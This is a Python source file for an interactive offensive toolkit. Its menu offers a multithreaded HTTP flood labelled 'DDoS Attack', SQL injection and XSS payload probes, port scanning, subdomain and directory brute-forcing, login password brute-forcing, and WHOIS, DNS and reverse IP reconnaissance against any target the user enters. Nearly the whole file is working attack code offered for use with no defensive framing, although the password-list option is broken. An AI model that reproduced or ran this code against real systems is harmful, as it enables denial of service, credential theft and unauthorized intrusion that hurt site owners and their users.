import threading
import requests
import time
import random
import socket
import sys
import ssl
import dns.resolver
import whois
from bs4 import BeautifulSoup

global stop_flag
stop_flag = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def attack(target_url, delay, thread_id):
    global stop_flag
    count = 0
    while not stop_flag:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(target_url, headers=headers)
            count += 1
            if count % 10 == 0:
                print(f"[Thread {thread_id}] {count} requests sent - Last status: {response.status_code}", flush=True)
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}", flush=True)
        time.sleep(delay)

def scan_website(url):
    try:
        domain = url.split("//")[-1].split("/")[0]
        ip_address = socket.gethostbyname(domain)
        response = requests.get(url)
        server_header = response.headers.get('Server', 'Not found')
        technologies = response.headers.get('x-powered-by', 'Unknown')
        
        print("\nWebsite Scan Results:")
        print(f"URL: {url}")
        print(f"IP Address: {ip_address}")
        print(f"Server: {server_header}")
        print(f"Technology: {technologies}")
    except Exception as e:
        print(f"Error while scanning: {e}")

def sql_injection(target_url):
    global stop_flag
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1' /*"]
    for payload in payloads:
        if stop_flag:
            break
        try:
            response = requests.get(f"{target_url}?id={payload}")
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[!] Possible SQL Injection vulnerability found with payload: {payload}")
            else:
                print(f"[+] Payload {payload} did not trigger an error.")
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

def xss_attack(target_url):
    global stop_flag
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        if stop_flag:
            break
        try:
            response = requests.get(f"{target_url}?q={payload}")
            if payload in response.text:
                print(f"[!] Possible XSS vulnerability found with payload: {payload}")
            else:
                print(f"[+] Payload {payload} did not trigger XSS.")
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

def port_scan(target_ip, start_port, end_port):
    global stop_flag
    print(f"\nScanning ports {start_port} to {end_port} on {target_ip}...")
    for port in range(start_port, end_port + 1):
        if stop_flag:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"[+] Port {port} is open")
            sock.close()
        except Exception as e:
            print(f"[!] Error scanning port {port}: {e}")

def subdomain_enumeration(domain, wordlist):
    global stop_flag
    print(f"\nEnumerating subdomains for {domain}...")
    try:
        with open(wordlist, "r") as file:
            for line in file:
                if stop_flag:
                    break
                subdomain = line.strip()
                url = f"http://{subdomain}.{domain}"
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(f"[+] Found: {url}")
                except requests.exceptions.RequestException:
                    pass
    except Exception as e:
        print(f"[!] Error reading wordlist: {e}")

def directory_bruteforce(target_url, wordlist):
    global stop_flag
    print(f"\nBruteforcing directories on {target_url}...")
    try:
        with open(wordlist, "r") as file:
            for line in file:
                if stop_flag:
                    break
                directory = line.strip()
                url = f"{target_url}/{directory}"
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        print(f"[+] Found: {url}")
                except requests.exceptions.RequestException:
                    pass
    except Exception as e:
        print(f"[!] Error reading wordlist: {e}")

def crawl_website(target_url):
    global stop_flag
    print(f"\nCrawling {target_url}...")
    try:
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, "html.parser")
        for link in soup.find_all("a"):
            if stop_flag:
                break
            href = link.get("href")
            if href and href.startswith("http"):
                print(f"[+] Found link: {href}")
    except Exception as e:
        print(f"[!] Error crawling: {e}")

def whois_lookup(domain):
    global stop_flag
    print(f"\nPerforming WHOIS lookup for {domain}...")
    try:
        domain_info = whois.whois(domain)
        print(domain_info)
    except Exception as e:
        print(f"[!] Error performing WHOIS lookup: {e}")

def reverse_ip_lookup(ip_address):
    global stop_flag
    print(f"\nPerforming reverse IP lookup for {ip_address}...")
    try:
        response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip_address}")
        if response.status_code == 200:
            print(response.text)
        else:
            print("[!] Error performing reverse IP lookup.")
    except Exception as e:
        print(f"[!] Error: {e}")

def ssl_checker(domain):
    global stop_flag
    print(f"\nChecking SSL/TLS configuration for {domain}...")
    context = ssl.create_default_context()
    try:
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                print(f"[+] SSL/TLS version: {ssock.version()}")
                print(f"[+] Certificate issuer: {ssock.getpeercert()['issuer']}")
    except Exception as e:
        print(f"[!] Error checking SSL/TLS: {e}")

def brute_force_login(target_url, username, password_list):
    global stop_flag
    print(f"\nBrute forcing login for {username} on {target_url}...")
    for password in password_list:
        if stop_flag:
            break
        try:
            response = requests.post(target_url, data={"username": username, "password": password})
            if "login failed" not in response.text.lower():
                print(f"[+] Found credentials: {username}:{password}")
                break
        except Exception as e:
            print(f"[!] Error: {e}")

def dns_enumeration(domain):
    global stop_flag
    print(f"\nEnumerating DNS records for {domain}...")
    record_types = ["A", "MX", "NS", "TXT", "CNAME"]
    for record in record_types:
        if stop_flag:
            break
        try:
            answers = dns.resolver.resolve(domain, record)
            for rdata in answers:
                print(f"[+] {record} record: {rdata}")
        except Exception as e:
            print(f"[!] Error retrieving {record} record: {e}")

def exploit_suggester(software_name, version):
    global stop_flag
    print(f"\nSuggesting exploits for {software_name} {version}...")
    try:
        response = requests.get(f"https://api.exploitsuggest.com/search?q={software_name}+{version}")
        if response.status_code == 200:
            print(response.text)
        else:
            print("[!] Error suggesting exploits.")
    except Exception as e:
        print(f"[!] Error: {e}")

def print_menu():
    print("\nMAIN MENU")
    print("1. DDoS Attack")
    print("2. Website Scanner")
    print("3. SQL Injection Test")
    print("4. XSS Attack Test")
    print("5. Port Scanner")
    print("6. Subdomain Enumeration")
    print("7. Directory Bruteforce")
    print("8. Website Crawler")
    print("9. WHOIS Lookup")
    print("10. Reverse IP Lookup")
    print("11. SSL/TLS Checker")
    print("12. Brute Force Login")
    print("13. DNS Enumeration")
    print("14. Exploit Suggester")
    print("15. Exit")
    sys.stdout.flush()

def fanxiety_tool():
    global stop_flag
    while True:
        print_menu()
        choice = input("Select an option: ")
        
        if choice == "1":
            print("Number of Threads (example: 100): ", end="", flush=True)
            thread_count = int(input())
            print("Target URL: ", end="", flush=True)
            target_url = input()
            print("Delay (seconds): ", end="", flush=True)
            delay = float(input())
            
            print("\nAttack started! Type 'stop' to end the attack.", flush=True)
            
            threads = []
            for i in range(thread_count):
                thread = threading.Thread(target=attack, args=(target_url, delay, i))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            while True:
                command = input()
                if command.lower() == "stop":
                    stop_flag = True
                    print("Stopping attack...", flush=True)
                    break
            
        elif choice == "2":
            print("Enter URL to scan: ", end="", flush=True)
            target_url = input()
            scan_website(target_url)
        
        elif choice == "3":
            print("Enter URL to test for SQL Injection: ", end="", flush=True)
            target_url = input()
            sql_injection(target_url)
            stop_flag = False
        
        elif choice == "4":
            print("Enter URL to test for XSS: ", end="", flush=True)
            target_url = input()
            xss_attack(target_url)
            stop_flag = False
        
        elif choice == "5":
            print("Enter target IP: ", end="", flush=True)
            target_ip = input()
            print("Enter start port: ", end="", flush=True)
            start_port = int(input())
            print("Enter end port: ", end="", flush=True)
            end_port = int(input())
            port_scan(target_ip, start_port, end_port)
            stop_flag = False
        
        elif choice == "6":
            print("Enter domain: ", end="", flush=True)
            domain = input()
            print("Enter path to wordlist: ", end="", flush=True)
            wordlist = input()
            subdomain_enumeration(domain, wordlist)
            stop_flag = False
        
        elif choice == "7":
            print("Enter target URL: ", end="", flush=True)
            target_url = input()
            print("Enter path to wordlist: ", end="", flush=True)
            wordlist = input()
            directory_bruteforce(target_url, wordlist)
            stop_flag = False
        
        elif choice == "8":
            print("Enter target URL: ", end="", flush=True)
            target_url = input()
            crawl_website(target_url)
            stop_flag = False
        
        elif choice == "9":
            print("Enter domain: ", end="", flush=True)
            domain = input()
            whois_lookup(domain)
            stop_flag = False
        
        elif choice == "10":
            print("Enter IP address: ", end="", flush=True)
            ip_address = input()
            reverse_ip_lookup(ip_address)
            stop_flag = False
        
        elif choice == "11":
            print("Enter domain: ", end="", flush=True)
            domain = input()
            ssl_checker(domain)
            stop_flag = False
        
        elif choice == "12":
            print("Enter target URL: ", end="", flush=True)
            target_url = input()
            print("Enter username: ", end="", flush=True)
            username = input()
            print("Enter path to password list: ", end="", flush=True)
            password_list = input().splitlines()
            brute_force_login(target_url, username, password_list)
            stop_flag = False
        
        elif choice == "13":
            print("Enter domain: ", end="", flush=True)
            domain = input()
            dns_enumeration(domain)
            stop_flag = False
        
        elif choice == "14":
            print("Enter software name: ", end="", flush=True)
            software_name = input()
            print("Enter version: ", end="", flush=True)
            version = input()
            exploit_suggester(software_name, version)
            stop_flag = False
        
        elif choice == "15":
            print("Exiting...")
            exit()
        
        else:
            print("Invalid option!")

if __name__ == "__main__":
    try:
        fanxiety_tool()
    except KeyboardInterrupt:
        print("\nProcess stopped.")
        exit()
